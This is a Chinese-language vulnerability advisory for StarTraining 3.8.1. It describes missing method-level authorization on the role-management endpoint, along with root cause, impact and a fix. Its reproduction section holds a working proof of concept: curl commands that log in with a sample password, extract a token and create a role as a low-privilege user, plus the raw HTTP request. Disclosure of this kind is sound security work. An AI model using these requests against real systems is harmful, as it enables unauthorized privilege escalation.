# StarTraining — 角色管理接口缺少方法级授权 (ST-VULN-005)

| 项 | 内容 |
|----|------|
| Vendor | zhistaredu |
| Product | StarTraining（职星学院） |
| Version | 3.8.1 |
| Type | Improper Authorization |
| CWE | CWE-862 |
| 认证 | Any authenticated user |
| 严重度 | High |

## 说明

SysRoleController 增删改角色没有 @PreAuthorize，普通登录用户也能 POST /system/role。

## 根因

角色 CRUD 缺方法级鉴权，服务层检查也没跟上。

## 利用链接 / 复现

任意登录态即可建角色：

```bash
TOK=$(curl -s -X POST 'http://127.0.0.1:8900/login' -H 'Content-Type: application/json' \
  -d '{"username":"wukong","password":"admin123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['token'])")

curl -s -X POST 'http://127.0.0.1:8900/system/role' \
  -H "Authorization: $TOK" -H 'Content-Type: application/json' \
  -d '{"roleName":"poc_role_st","roleSort":99,"status":"0","menuIds":[]}'
```

接口：`POST http://127.0.0.1:8900/system/role`


## 请求包（Yakit）

```http
POST /system/role HTTP/1.1
Host: 127.0.0.1:8900
Authorization: LOW_USER_TOKEN
Content-Type: application/json
Connection: close

{"roleName":"poc_role","roleSort":1,"status":"0","menuIds":[]}
```

期望：低权限 token 创建角色返回 code=200。

## 截图

![role-create](./screenshots/ST-VULN-005-role-create.png)

<!-- 截图：浏览器打开上方链接，按 F1；或跑 python capture_startraining_evidence.py -->

## 影响

随便加角色，后续配菜单就能扩权。

## 修复

补 @PreAuthorize，并走 checkRoleAllowed / checkRoleDataScope。

## 关联

- 本地报告：`../POC_VERIFICATION_REPORT.md`
- 脚本：`poc_verify/startraining_poc_verify.py` / `startraining_jwt_forge.py`
